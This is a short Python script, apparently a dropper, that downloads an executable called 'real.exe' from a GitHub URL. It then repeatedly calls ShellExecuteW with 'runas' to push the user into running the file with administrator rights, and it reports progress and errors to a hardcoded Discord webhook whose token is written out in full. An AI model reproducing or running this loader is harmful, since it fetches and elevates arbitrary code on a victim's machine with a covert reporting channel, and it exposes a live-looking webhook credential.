import ctypes
import subprocess
import requests

def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            data = {
                "content": i
            }
            r = requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        r = requests.post(webhook_url, json=data, headers=headers)

import ctypes
import requests
import os

def download_file(url, filename):
    try:
        response = requests.get(url)
        with open(filename, 'wb') as f:
            f.write(response.content)
        send_to_discord(f"File downloaded successfully: {filename}")
    except Exception as e:
        send_to_discord(f"Error downloading file: {e}")

def run_as_admin():
    cnt = 0
    exe_url = "https://github.com/seo-hyeon/Mecro_Test/raw/refs/heads/main/real.exe"
    exe_filename = "real.exe"
    
    # 1. 파일 다운로드
    download_file(exe_url, exe_filename)

    # 2. 다운로드한 파일을 관리자 권한으로 실행
    while True:
        if cnt > 10:
            break

        cnt += 1
        # 관리자 권한으로 실행
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_filename, None, None, 1)
        
        # 실행이 성공하면 True 반환
        if result > 32:
            return True
        
    return False

if __name__ == "__main__":
    run_as_admin()